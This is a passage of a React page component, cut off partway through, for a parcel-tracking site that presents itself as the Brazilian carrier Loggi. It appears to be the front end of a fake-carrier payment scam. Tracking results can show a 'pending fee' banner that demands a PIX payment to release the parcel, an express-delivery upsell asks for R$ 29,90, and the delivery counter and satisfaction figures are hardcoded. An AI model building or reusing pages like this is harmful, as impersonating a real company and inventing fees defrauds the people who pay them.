import React, { useState, useEffect } from 'react';
import { Search, Zap, ArrowRight, Globe, QrCode, Satellite, Package, Warehouse, GitBranch, RotateCcw, Smile, Star, Clock, TrendingUp, Calculator, MapPinned, Truck, CheckCircle } from 'lucide-react';
import { Link } from 'react-router-dom';
import Header from '../components/Header';
import Footer from '../components/Footer';

const API_BASE = import.meta.env.VITE_API_URL || '';

const Home: React.FC = () => {
    const [codigo, setCodigo] = useState('');
    const [cidade, setCidade] = useState('');
    const [loading, setLoading] = useState(false);
    const [trackResult, setTrackResult] = useState<any>(null);
    const [trackError, setTrackError] = useState('');
    const [activeTab, setActiveTab] = useState<'voce' | 'empresas'>('voce');
    const [heroCounter, setHeroCounter] = useState(0);
    const [showExpressModal, setShowExpressModal] = useState(false);

    // PixGo Integration State
    const [pixLoading, setPixLoading] = useState(false);
    const [pixData, setPixData] = useState<any>(null);
    const [pixPaid, setPixPaid] = useState(false);

    // Tax Modal State
    const [showTaxModal, setShowTaxModal] = useState(false);
    const [taxPixLoading, setTaxPixLoading] = useState(false);
    const [taxPixData, setTaxPixData] = useState<any>(null);
    const [taxPixPaid, setTaxPixPaid] = useState(false);

    useEffect(() => {
        let interval: any;
        if (pixData && !pixPaid) {
            interval = setInterval(async () => {
                try {
                    const res = await fetch(`${API_BASE}/api/pix/status/${pixData.payment_id}`);
                    const json = await res.json();
                    if (json && json.success && json.data?.status === 'completed') {
                        setPixPaid(true);
                        clearInterval(interval);
                    }
                } catch (e) { }
            }, 5000);
        }
        return () => clearInterval(interval);
    }, [pixData, pixPaid]);

    useEffect(() => {
        let interval: any;
        if (taxPixData && !taxPixPaid) {
            interval = setInterval(async () => {
                try {
                    const res = await fetch(`${API_BASE}/api/pix/status/${taxPixData.payment_id}`);
                    const json = await res.json();
                    if (json && json.success && json.data?.status === 'completed') {
                        setTaxPixPaid(true);
                        clearInterval(interval);
                    }
                } catch (e) { }
            }, 5000);
        }
        return () => clearInterval(interval);
    }, [taxPixData, taxPixPaid]);

    // Observer para Animação de Entrada
    useEffect(() => {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('reveal-active');
                }
            });
        }, { threshold: 0.1 });

        document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
        return () => observer.disconnect();
    }, [activeTab]);

    // Contador animado
    useEffect(() => {
        const target = 10247;
        const duration = 2000;
        const steps = 60;
        const increment = target / steps;
        let current = 0;
        const timer = setInterval(() => {
            current += increment;
            if (current >= target) { setHeroCounter(target); clearInterval(timer); }
            else setHeroCounter(Math.floor(current));
        }, duration / steps);
        return () => clearInterval(timer);
    }, []);

    const handleSearch = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!codigo || !cidade) return;
        setLoading(true);
        setTrackError('');
        setTrackResult(null);

        try {
            const res = await fetch(`${API_BASE}/api/rastreio`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ codigo: codigo.toUpperCase(), cidade }),
            });
            const data = await res.json();
            if (data.success && data.etapas?.length > 0) {
                setTrackResult(data);
            } else {
                setTrackError(data.message || 'Código não encontrado.');
            }
        } catch {
            setTrackError('Erro ao conectar com o servidor. Tente novamente mais tarde.');
        } finally {
            setLoading(false);
        }
    };

    const formatDate = (dateStr: string) => {
        const d = new Date(dateStr);
        return d.toLocaleDateString('pt-BR') + ' ' + d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
    };

    const getStatusIcon = (status: string) => {
        const s = status.toLowerCase();
        if (s.includes('saiu') || s.includes('entrega') || s.includes('rota')) return <Truck size={32} color="#6366f1" />;
        if (s.includes('trânsito') || s.includes('transito')) return <Package size={32} color="#818cf8" />;
        if (s.includes('postado') || s.includes('coletado')) return <Warehouse size={32} color="#a855f7" />;
        if (s.includes('entregue')) return <CheckCircle size={32} color="#10b981" />;
        return <MapPinned size={32} color="#6366f1" />;
    };

    return (
        <div className="home-page">
            <style>{`
                .home-page {
                    background: #06060b;
                    color: #fff;
                    min-height: 100vh;
                    position: relative;
                    overflow-x: hidden;
                }
                .home-page * { box-sizing: border-box; }

                /* ===== BG EFFECTS ===== */
                .bg-mesh {
                    position: fixed; inset: 0; pointer-events: none; z-index: 0;
                    background:
                        radial-gradient(ellipse 80% 50% at 50% -20%, rgba(99, 102, 241, 0.15), transparent),
                        radial-gradient(ellipse 60% 40% at 80% 50%, rgba(168, 85, 247, 0.08), transparent),
                        radial-gradient(ellipse 50% 30% at 20% 80%, rgba(6, 182, 212, 0.06), transparent);
                }
                .bg-grid {
                    position: fixed; inset: 0; pointer-events: none; z-index: 0;
                    background-image: linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
                                      linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
                    background-size: 60px 60px;
                    mask-image: radial-gradient(ellipse 70% 60% at 50% 0%, black 40%, transparent 100%);
                }

                /* ===== REVEAL ANIMATION ===== */
                .reveal {
                    opacity: 0;
                    transform: translateY(30px) scale(0.95);
                    transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1);
                }
                .reveal-active {
                    opacity: 1;
                    transform: translateY(0) scale(1);
                }
                .reveal-delay-1 { transition-delay: 0.1s; }
                .reveal-delay-2 { transition-delay: 0.2s; }
                .reveal-delay-3 { transition-delay: 0.3s; }

                /* ===== HERO ===== */
                .hero-section {
                    position: relative; z-index: 1;
                    padding: 40px 24px 60px;
                    max-width: 1280px; margin: 0 auto;
                    display: flex; align-items: center; gap: 60px;
                }
                .hero-left { flex: 1; min-width: 0; }
                .hero-glass-card {
                    padding: 48px 40px;
                    border-radius: 28px;
                    background: rgba(255, 255, 255, 0.02);
                    backdrop-filter: blur(20px);
                    border: 1px solid rgba(255,255,255,0.06);
                    box-shadow: 0 16px 48px rgba(0,0,0,0.25), inset 0 1px 0 rgba(255,255,255,0.04);
                    position: relative; overflow: hidden;
                }
                .hero-glass-card::before {
                    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
                    background: linear-gradient(90deg, #6366f1, #a855f7, #22d3ee);
                }
                .hero-right { flex: 1; min-width: 0; display: flex; flex-direction: column; align-items: center; gap: 20px; }
                .hero-badge {
                    display: inline-flex; align-items: center; gap: 8px;
                    padding: 8px 16px 8px 10px;
                    background: rgba(99, 102, 241, 0.08);
                    border: 1px solid rgba(99, 102, 241, 0.2);
                    border-radius: 100px;
                    font-size: 0.8rem; font-weight: 600;
                    color: #a5b4fc;
                    margin-bottom: 24px;
                    animation: fadeIn 0.5s ease;
                }
                .hero-badge-dot {
                    width: 8px; height: 8px; border-radius: 50%;
                    background: #6366f1;
                    box-shadow: 0 0 10px rgba(99, 102, 241, 0.6);
                    animation: pulse-dot 2s ease infinite;
                }
                @keyframes pulse-dot {
                    0%, 100% { opacity: 1; transform: scale(1); }
                    50% { opacity: 0.5; transform: scale(1.5); }
                }
                .hero-title {
                    font-size: clamp(2.2rem, 5.5vw, 4rem);
                    font-weight: 900; line-height: 1.08;
                    letter-spacing: -2px;
                    margin-bottom: 20px;
                    font-family: 'Outfit', sans-serif;
                }
                .hero-title .gradient-word {
                    background: linear-gradient(135deg, #818cf8, #c084fc, #22d3ee);
                    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
                    background-clip: text;
                }
                .hero-desc {
                    color: rgba(255,255,255,0.5);
                    font-size: clamp(0.95rem, 2vw, 1.1rem);
                    line-height: 1.7; margin-bottom: 32px; max-width: 520px;
                }
                .hero-actions { display: flex; gap: 12px; margin-bottom: 48px; flex-wrap: wrap; }
                .cta-primary {
                    display: inline-flex; align-items: center; gap: 10px;
                    padding: 16px 32px;
                    background: linear-gradient(135deg, #6366f1, #a855f7);
                    border-radius: 14px; color: white; text-decoration: none;
                    font-weight: 700; font-size: 0.95rem;
                    box-shadow: 0 8px 32px rgba(99, 102, 241, 0.4);
                    transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
                    position: relative; overflow: hidden;
                    white-space: nowrap; justify-content: center;
                }
                .cta-primary::after {
                    content: ''; position: absolute; top: 0; left: -100%;
                    width: 100%; height: 100%;
                    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
                    transition: left 0.6s;
                }
                .cta-primary:hover::after { left: 100%; }
                .cta-primary:hover { transform: translateY(-3px); box-shadow: 0 16px 40px rgba(99, 102, 241, 0.5); }
                .cta-secondary {
                    display: inline-flex; align-items: center; gap: 8px;
                    padding: 16px 28px;
                    border: 1px solid rgba(255,255,255,0.12); border-radius: 14px;
                    color: white; text-decoration: none; font-weight: 600; font-size: 0.95rem;
                    background: rgba(255,255,255,0.03);
                    transition: all 0.3s;
                    white-space: nowrap; justify-content: center;
                }
                .cta-secondary:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); }

                /* ===== TRACKING FORM ===== */
                .track-form { max-width: 500px; }
                .track-fields { display: flex; flex-direction: column; gap: 10px; margin-bottom: 12px; }
                .track-input-wrap {
                    display: flex; align-items: center; gap: 12px;
                    background: rgba(255,255,255,0.04);
                    border: 1px solid rgba(255,255,255,0.08);
                    border-radius: 14px; padding: 4px 16px;
                    transition: all 0.3s;
                }
                .track-input-wrap:focus-within {
                    border-color: rgba(99, 102, 241, 0.5);
                    box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.15);
                    background: rgba(99, 102, 241, 0.04);
                }
                .track-input {
                    flex: 1; background: transparent; border: none; color: white;
                    padding: 14px 0; font-size: 0.95rem; outline: none; font-family: 'Inter', sans-serif;
                }
                .track-input::placeholder { color: rgba(255,255,255,0.25); }
                .track-submit {
                    width: 100%; padding: 16px; border: none; border-radius: 14px;
                    background: linear-gradient(135deg, #6366f1, #a855f7);
                    color: white; font-weight: 700; font-size: 1rem; cursor: pointer;
                    font-family: 'Outfit', sans-serif;
                    box-shadow: 0 8px 24px rgba(99, 102, 241, 0.3);
                    transition: all 0.3s;
                }
                .track-submit:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(99, 102, 241, 0.5); }
                .track-submit:disabled { opacity: 0.7; cursor: not-allowed; }

                /* ===== HERO RIGHT FLOATING CARDS ===== */
                .float-card {
                    padding: 28px 32px; border-radius: 24px;
                    background: rgba(255,255,255,0.03);
                    backdrop-filter: blur(20px);
                    border: 1px solid rgba(255,255,255,0.08);
                    text-align: center; min-width: 220px;
                    transition: all 0.4s;
                }
                .float-card:hover {
                    border-color: rgba(99, 102, 241, 0.3);
                    transform: translateY(-4px);
                    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
                }
                .float-card-value {
                    font-size: 2.8rem; font-weight: 900;
                    font-family: 'Outfit', sans-serif;
                    background: linear-gradient(135deg, #818cf8, #c084fc);
                    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
                    background-clip: text;
                }
                .float-card-label { color: rgba(255,255,255,0.45); font-size: 0.85rem; margin-top: 6px; }

                /* ===== RESULT AREA ===== */
                .result-area {
                    position: relative; z-index: 1;
                    max-width: 800px; margin: 0 auto; padding: 0 24px 60px;
                }
                .error-card {
                    padding: 48px; border-radius: 28px; text-align: center;
                    background: rgba(255,255,255,0.02);
                    backdrop-filter: blur(20px);
                    border: 1px solid rgba(239, 68, 68, 0.2);
                }
                .result-card {
                    padding: 32px; border-radius: 28px;
                    background: rgba(255,255,255,0.02);
                    backdrop-filter: blur(20px);
                    border: 1px solid rgba(255,255,255,0.08);
                }
                .status-header {
                    display: flex; align-items: center; gap: 20px;
                    padding: 24px; margin-bottom: 24px;
                    background: rgba(99, 102, 241, 0.04);
                    border-radius: 20px; border: 1px solid rgba(99, 102, 241, 0.1);
                }
                .status-icon-box {
                    width: 64px; height: 64px; border-radius: 20px;
                    background: rgba(99, 102, 241, 0.08);
                    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
                }
                .tl-item { display: flex; gap: 20px; }
                .tl-marker { display: flex; flex-direction: column; align-items: center; width: 20px; flex-shrink: 0; }
                .tl-dot {
                    width: 14px; height: 14px; border-radius: 50%;
                    border: 2px solid rgba(255,255,255,0.08); flex-shrink: 0; z-index: 2;
                }
                .tl-line { width: 2px; flex: 1; background: rgba(255,255,255,0.06); min-height: 40px; }
                .tl-content { flex: 1; padding: 14px 18px; border-radius: 14px; margin-bottom: 10px; }
                .express-box { text-align: center; padding: 24px 0 0; margin-top: 20px; border-top: 2px dashed rgba(255,255,255,0.06); }
                .express-btn {
                    padding: 16px 32px; border: none; border-radius: 16px;
                    background: linear-gradient(135deg, #0096ff, #6366f1);
                    color: white; font-weight: 800; font-size: 1rem; cursor: pointer;
                    box-shadow: 0 8px 24px rgba(0, 150, 255, 0.3);
                    font-family: 'Outfit', sans-serif;
                    transition: all 0.3s;
                }
                .express-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(0, 150, 255, 0.5); }

                /* ===== TABS ===== */
                .tabs-wrap {
                    position: relative; z-index: 1;
                    max-width: 1280px; margin: 0 auto;
                    padding: 30px 24px 0;
                }
                .tabs-bar {
                    display: inline-flex; gap: 4px; padding: 4px;
                    background: rgba(255,255,255,0.03);
                    border-radius: 16px; border: 1px solid rgba(255,255,255,0.06);
                }
                .tab-btn {
                    padding: 12px 28px; background: transparent; border: none;
                    color: rgba(255,255,255,0.45); cursor: pointer;
                    border-radius: 12px; font-weight: 600; font-size: 0.9rem;
                    font-family: 'Outfit', sans-serif; transition: all 0.3s;
                }
                .tab-btn:hover { color: white; }
                .tab-btn.active {
                    background: linear-gradient(135deg, #6366f1, #a855f7);
                    color: white; font-weight: 700;
                    box-shadow: 0 4px 16px rgba(99, 102, 241, 0.35);
                }

                /* ===== SECTION ===== */
                .content-section {
                    position: relative; z-index: 1;
                    padding: 60px 24px 80px;
                    max-width: 1280px; margin: 0 auto;
                    animation: fadeIn 0.6s ease;
                }
                .section-header {
                    margin-bottom: 48px;
                }
                .section-label {
                    display: inline-flex; align-items: center; gap: 8px;
                    padding: 6px 14px;
                    background: rgba(99, 102, 241, 0.08);
                    border: 1px solid rgba(99, 102, 241, 0.15);
                    border-radius: 100px;
                    font-size: 0.78rem; font-weight: 600; color: #a5b4fc;
                    margin-bottom: 16px; text-transform: uppercase; letter-spacing: 0.05em;
                }
                .section-title {
                    font-size: clamp(1.8rem, 4vw, 2.8rem);
                    font-weight: 900; letter-spacing: -1px;
                    font-family: 'Outfit', sans-serif;
                    line-height: 1.15;
                }
                .section-title .gradient-word {
                    background: linear-gradient(135deg, #818cf8, #c084fc, #22d3ee);
                    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
                    background-clip: text;
                }
                .section-subtitle {
                    color: rgba(255,255,255,0.4);
                    font-size: 1.05rem; margin-top: 12px; max-width: 500px;
                }

                /* ===== FEATURE CARDS ===== */
                .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
                .feature-card {
                    padding: 32px; border-radius: 24px;
                    background: rgba(255,255,255,0.02);
                    backdrop-filter: blur(16px);
                    border: 1px solid rgba(255,255,255,0.06);
                    display: flex; flex-direction: column; gap: 16px;
                    transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
                    transform-style: preserve-3d;
                }
                .feature-card:hover {
                    background: rgba(255,255,255,0.05);
                    border-color: rgba(99, 102, 241, 0.3);
                    transform: translateY(-8px) rotateX(2deg);
                    box-shadow: 0 24px 48px rgba(0,0,0,0.4), 0 0 0 1px rgba(99, 102, 241, 0.1);
                }
                .feature-icon {
                    width: 56px; height: 56px; border-radius: 16px;
                    display: flex; align-items: center; justify-content: center;
                }
                .feature-card h3 { font-size: 1.15rem; font-weight: 700; }
                .feature-card p { color: rgba(255,255,255,0.4); line-height: 1.6; font-size: 0.9rem; flex: 1; }
                .feature-link {
                    color: #818cf8; text-decoration: none; font-weight: 700; font-size: 0.85rem;
                    display: flex; align-items: center; gap: 6px; transition: gap 0.3s;
                }
                .feature-link:hover { gap: 10px; color: #a5b4fc; }

                /* ===== METRICS BAR ===== */
                .metrics-bar {
                    position: relative; z-index: 1;
                    padding: 40px 24px;
                    max-width: 1280px; margin: 0 auto;
                    display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px;
                }
                .metric-card {
                    padding: 32px 20px; border-radius: 24px; text-align: center;
                    background: rgba(255,255,255,0.02);
                    backdrop-filter: blur(16px);
                    border: 1px solid rgba(255,255,255,0.06);
                    transition: all 0.4s;
                }
                .metric-card:hover {
                    border-color: rgba(99, 102, 241, 0.3);
                    transform: translateY(-4px);
                    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
                }
                .metric-icon {
                    width: 48px; height: 48px; border-radius: 14px;
                    display: flex; align-items: center; justify-content: center;
                    margin: 0 auto 12px;
                }
                .metric-value {
                    font-size: 2rem; font-weight: 900;
                    font-family: 'Outfit', sans-serif;
                    background: linear-gradient(135deg, #818cf8, #c084fc);
                    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
                    background-clip: text;
                }
                .metric-label { color: rgba(255,255,255,0.4); font-size: 0.85rem; margin-top: 4px; }

                /* ===== TESTIMONIALS ===== */
                .testimonials-section {
                    position: relative; z-index: 1;
                    padding: 100px 24px;
                    background: linear-gradient(180deg, transparent, rgba(99, 102, 241, 0.03), transparent);
                    border-top: 1px solid rgba(255,255,255,0.04);
                    border-bottom: 1px solid rgba(255,255,255,0.04);
                }
                .testimonials-inner { max-width: 1280px; margin: 0 auto; }
                .testimonial-card {
                    padding: 32px; border-radius: 24px;
                    background: rgba(255,255,255,0.02);
                    backdrop-filter: blur(16px);
                    border: 1px solid rgba(255,255,255,0.06);
                    display: flex; flex-direction: column; gap: 16px;
                    transition: all 0.4s;
                }
                .testimonial-card:hover {
                    border-color: rgba(99, 102, 241, 0.25);
                    transform: translateY(-4px);
                }
                .testimonial-stars { display: flex; gap: 3px; }
                .testimonial-text { color: rgba(255,255,255,0.45); line-height: 1.7; font-size: 0.95rem; font-style: italic; flex: 1; }

                /* ===== FOOTER ===== */
                .site-footer {
                    position: relative; z-index: 1;
                    border-top: 1px solid rgba(255,255,255,0.04);
                    padding: 80px 24px 40px;
                }
                .footer-inner {
                    max-width: 1280px; margin: 0 auto 60px;
                    display: flex; justify-content: space-between; gap: 40px; flex-wrap: wrap;
                }
                .footer-brand-col { max-width: 320px; }
                .footer-links-wrap { display: flex; gap: 60px; flex-wrap: wrap; }
                .footer-col {
                    display: flex; flex-direction: column; gap: 10px;
                }
                .footer-col h4 { font-weight: 700; font-size: 0.9rem; margin-bottom: 6px; color: rgba(255,255,255,0.8); }
                .footer-col a { color: rgba(255,255,255,0.35); text-decoration: none; font-size: 0.85rem; transition: color 0.2s; }
                .footer-col a:hover { color: white; }
                .footer-bottom {
                    max-width: 1280px; margin: 0 auto;
                    text-align: center; color: rgba(255,255,255,0.2); font-size: 0.8rem;
                    border-top: 1px solid rgba(255,255,255,0.04); padding-top: 32px;
                }

                /* ===== ANIMATIONS ===== */
                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(20px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes float {
                    0%, 100% { transform: translateY(0) rotate(-2deg); }
                    50% { transform: translateY(-12px) rotate(-1deg); }
                }
                @keyframes float2 {
                    0%, 100% { transform: translateY(0) rotate(2deg); }
                    50% { transform: translateY(-8px) rotate(3deg); }
                }

                /* ===== RESPONSIVO ===== */
                @media (max-width: 1024px) {
                    .hero-section { flex-direction: column; gap: 40px; }
                    .hero-right { flex-direction: row; justify-content: center; }
                    .grid-3 { grid-template-columns: repeat(2, 1fr); }
                    .metrics-bar { grid-template-columns: repeat(2, 1fr); }
                }
                @media (max-width: 768px) {
                    .status-card { padding: 20px; }
                    .search-box-premium {
                        border-radius: 20px;
                        flex-direction: column;
                        padding: 15px;
                        gap: 15px;
                        background: rgba(255,255,255,0.05);
                    }
                    .search-input-premium {
                        text-align: center;
                        font-size: 1.1rem;
                        padding: 10px;
                    }
                    .btn-track {
                        width: 100%;
                        padding: 15px;
                        justify-content: center;
                    }
                    .desktop-nav { display: none !important; }
                    .mobile-toggle { display: flex !important; }
                    .hero-section { padding-top: 140px !important; flex-direction: column; gap: 40px; }
                    .status-header { flex-direction: column; text-align: center; gap: 20px; align-items: center !important; }
                    .status-icon-box { margin: 0 auto; width: 64px; height: 64px; }
                    .status-header h3 { flex-direction: column !important; gap: 10px !important; font-size: 1.25rem !important; }
                    .tax-badge { font-size: 0.65rem !important; padding: 4px 10px !important; }
                    .hero-title { letter-spacing: -1px; font-size: 2.2rem !important; margin-top: 20px; }
                    .hero-desc { font-size: 0.95rem !important; }
                    .hero-glass-card { padding: 32px 20px; }
                    .hero-right { display: none !important; }
                    .track-form-grid { grid-template-columns: 1fr; }
                    .track-input-wrap { padding: 12px; }
                    .track-submit { width: 100%; padding: 18px; }
                    .result-card { padding: 20px; }
                    .tax-box { flex-direction: column; text-align: center; }
                    .tax-btn { width: 100%; margin-top: 10px; }
                    .grid-3 { grid-template-columns: 1fr; }
                    .metrics-bar { grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 20px 16px; }
                    .metric-card { padding: 24px 16px; }
                    .metric-value { font-size: 1.6rem; }
                    .tabs-wrap { padding: 20px 16px 0; }
                    .content-section { padding: 40px 16px 60px; }
                    .testimonials-section { padding: 60px 16px; }
                    .site-footer { padding: 40px 16px 24px; }
                    .footer-links-wrap { gap: 32px; }
                    .track-submit { font-size: 0.95rem; padding: 14px; }
                }
                @media (max-width: 480px) {
                    .hero-actions { flex-direction: column; }
                    .cta-primary, .cta-secondary { justify-content: center; width: 100%; }
                    .metrics-bar { grid-template-columns: 1fr 1fr; }
                    .header-inner { padding: 12px 16px; }
                }
            `}</style>

            <div className="bg-mesh"></div>
            <div className="bg-grid"></div>

            <Header />

            {/* ===== HERO ===== */}
            <section className="hero-section">
                <div className="hero-left" style={{ animation: 'fadeIn 0.7s ease' }}>
                    <div className="hero-glass-card">
                        <div className="hero-badge">
                            <div className="hero-badge-dot"></div>
                            🚀 {heroCounter.toLocaleString('pt-BR')}+ entregas hoje
                        </div>

                        <h1 className="hero-title">
                            Sua encomenda,<br />nossa <span className="gradient-word">tecnologia.</span>
                        </h1>

                        <p className="hero-desc">
                            Rastreie, envie e gerencie seus pacotes em tempo real. A maior malha logística do Brasil com frete grátis para todo o país.
                        </p>

                        <div className="hero-actions">
                            <Link to="/pedido" className="cta-primary">
                                <Package size={18} /> Enviar agora
                            </Link>
                            <Link to="/pedido" className="cta-secondary">
                                <Calculator size={18} /> Calcular frete
                            </Link>
                        </div>

                        {/* Formulário de Rastreio */}
                        <form onSubmit={handleSearch} className="track-form">
                            <div className="track-fields">
                                <div className="track-input-wrap">
                                    <Search size={16} color="#6366f1" />
                                    <input className="track-input" placeholder="Código de rastreio" value={codigo} onChange={e => setCodigo(e.target.value.toUpperCase())} maxLength={30} required />
                                </div>
                                <div className="track-input-wrap">
                                    <MapPinned size={16} color="#6366f1" />
                                    <input className="track-input" placeholder="Sua cidade" value={cidade} onChange={e => setCidade(e.target.value)} required />
                                </div>
                            </div>
                            <button type="submit" className="track-submit" disabled={loading}>
                                {loading ? '⏳ Buscando...' : '🔍 Rastrear agora'}
                            </button>
                        </form>
                    </div>{/* fim hero-glass-card */}
                </div>

                <div className="hero-right">
                    <div className="float-card" style={{ animation: 'float 5s ease-in-out infinite', transform: 'rotate(-2deg)' }}>
                        <div className="float-card-value">+100M</div>
                        <div className="float-card-label">Objetos Entregues</div>
                    </div>
                    <div className="float-card" style={{ animation: 'float2 6s ease-in-out infinite', transform: 'rotate(2deg)' }}>
                        <div className="float-card-value">4.8★</div>
                        <div className="float-card-label">Satisfação dos Clientes</div>
                    </div>
                </div>
            </section>

            {/* ===== RESULTADO ===== */}
            {trackError && (
                <div className="result-area" style={{ animation: 'fadeIn 0.5s ease' }}>
                    <div className="error-card">
                        <span style={{ fontSize: '3rem' }}>❌</span>
                        <h3 style={{ color: '#ff6b6b', marginTop: '16px', fontSize: '1.2rem' }}>{trackError}</h3>
                    </div>
                </div>
            )}
            {trackResult && (
                <div className="result-area" style={{ animation: 'fadeIn 0.5s ease' }}>
                    <div className="result-card">
                        {trackResult.taxa_valor && (
                            <div style={{
                                background: 'rgba(239, 68, 68, 0.15)',
                                border: '1px solid rgba(239, 68, 68, 0.4)',
                                borderRadius: '24px',
                                padding: '24px',
                                marginBottom: '32px',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'space-between',
                                gap: '16px',
                                boxShadow: '0 8px 32px rgba(239, 68, 68, 0.15)'
                            }}>
                                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                                    <div style={{ width: '44px', height: '44px', background: 'rgba(239, 68, 68, 0.2)', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                        <Calculator size={24} color="#ef4444" />
                                    </div>
                                    <div style={{ textAlign: 'left' }}>
                                        <div style={{ color: '#ef4444', fontWeight: 900, fontSize: '0.9rem', textTransform: 'uppercase', letterSpacing: '1px' }}>Taxa Pendente Detectada</div>
                                        <div style={{ color: 'rgba(255,255,255,0.7)', fontSize: '0.85rem' }}>Efetue o pagamento para liberar sua encomenda.</div>
                                    </div>
                                </div>
                                <button
                                    onClick={() => setShowTaxModal(true)}
                                    className="tax-btn"
                                    style={{
                                        background: '#ef4444',
                                        color: '#fff',
                                        border: 'none',
                                        padding: '12px 24px',
                                        borderRadius: '14px',
                                        fontWeight: 900,
                                        fontSize: '0.9rem',
                                        cursor: 'pointer',
                                        boxShadow: '0 4px 15px rgba(239, 68, 68, 0.4)',
                                        transition: 'all 0.3s ease'
                                    }}
                                >
                                    Pagar Taxa: R$ {trackResult.taxa_valor}
                                </button>
                            </div>
                        )}
                        <div className="status-header">
                            <div className="status-icon-box" style={{ background: 'rgba(99, 102, 241, 0.1)', border: '1px solid rgba(99, 102, 241, 0.2)' }}>
                                {getStatusIcon(trackResult.etapas[trackResult.etapas.length - 1]?.status_atual || '')}
                            </div>
                            <div>
                                <h3 style={{ fontSize: '1.4rem', fontWeight: 900, background: 'linear-gradient(135deg, #fff, #a5b4fc)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', display: 'flex', alignItems: 'center', gap: '8px' }}>
                                    {trackResult.etapas[trackResult.etapas.length - 1]?.status_atual || 'Em processamento'}
                                    {trackResult.taxa_valor && (
                                        <span className="tax-badge" style={{
                                            background: '#ef4444',
                                            color: '#fff',
                                            fontSize: '0.7rem',
                                            padding: '4px 8px',
                                            borderRadius: '6px',
                                            WebkitTextFillColor: '#fff',
                                            fontWeight: 800,
                                            boxShadow: '0 0 10px rgba(239, 68, 68, 0.4)'
                                        }}>
                                            TAXA PENDENTE
                                        </span>
                                    )}
                                </h3>
                                <p style={{ color: 'rgba(255,255,255,0.45)', marginTop: '4px', fontSize: '0.95rem', display: 'flex', alignItems: 'center', gap: '6px' }}>
                                    <MapPinned size={14} /> {trackResult.cidade || cidade}
                                </p>
                            </div>
                        </div>
                        <div>
                            {trackResult.etapas.map((etapa: any, i: number) => {
                                const isLast = i === trackResult.etapas.length - 1;
                                return (
                                    <div key={i} className="tl-item">
                                        <div className="tl-marker">
                                            <div className="tl-dot" style={{
                                                background: isLast ? '#6366f1' : 'rgba(255,255,255,0.08)',
                                                boxShadow: isLast ? '0 0 16px rgba(99, 102, 241, 0.5)' : 'none',
                                            }}></div>
                                            {i < trackResult.etapas.length - 1 && <div className="tl-line"></div>}
                                        </div>
                                        <div className="tl-content" style={{
                                            background: isLast ? 'rgba(99, 102, 241, 0.06)' : 'transparent',
                                            border: isLast ? '1px solid rgba(99, 102, 241, 0.15)' : '1px solid transparent',
                                        }}>
                                            <h4 style={{ color: isLast ? '#818cf8' : 'white', fontWeight: 700 }}>{etapa.titulo}</h4>
                                            <p style={{ color: 'rgba(255,255,255,0.4)', fontSize: '0.9rem', margin: '4px 0' }}>{etapa.subtitulo}</p>
                                            <small style={{ color: '#818cf8', fontWeight: 600, fontSize: '0.8rem' }}>{formatDate(etapa.data)}</small>
                                        </div>
                                    </div>
                                );
                            })}
                        </div>
                        <div className="express-box">
                            <button className="express-btn" onClick={() => setShowExpressModal(true)}>⚡ Acelerar por R$ 29,90</button>
                            <p style={{ color: 'rgba(255,255,255,0.35)', fontSize: '0.85rem', marginTop: '8px' }}>Receba em até 3 dias úteis</p>
                        </div>
                    </div>
                </div>
            )}

            {/* ===== TABS ===== */}
            <div className="tabs-wrap reveal">
                <div className="tabs-bar">
                    <button className={`tab-btn ${activeTab === 'voce' ? 'active' : ''}`} onClick={() => setActiveTab('voce')}>Para você</button>
                    <button className={`tab-btn ${activeTab === 'empresas' ? 'active' : ''}`} onClick={() => setActiveTab('empresas')}>Para empresas</button>
                </div>
            </div>

            {/* ===== PARA VOCÊ ===== */}
            {activeTab === 'voce' && (
                <section id="para-voce" className="content-section reveal">
                    <div className="section-header">
                        <div className="section-label"><Zap size={12} /> Soluções pessoais</div>
                        <h2 className="section-title">A Loggi entrega onde<br />você <span className="gradient-word">precisar</span></h2>
                        <p className="section-subtitle">A maior malha logística privada do Brasil à sua disposição.</p>
                    </div>
                    <div className="grid-3">
                        {[
                            { icon: <QrCode size={28} color="#818cf8" />, bg: 'rgba(99, 102, 241, 0.08)', title: 'Postagem simples', desc: 'Gere sua etiqueta em poucos cliques e poste em qualquer ponto parceiro próximo a você.', link: '/pedido', linkText: 'Começar agora' },
                            { icon: <Satellite size={28} color="#c084fc" />, bg: 'rgba(168, 85, 247, 0.08)', title: 'Monitoramento GPS', desc: 'Acompanhe cada curva da sua encomenda com tecnologia de rastreio via satélite em tempo real.', link: '/rastreio', linkText: 'Ver como funciona' },
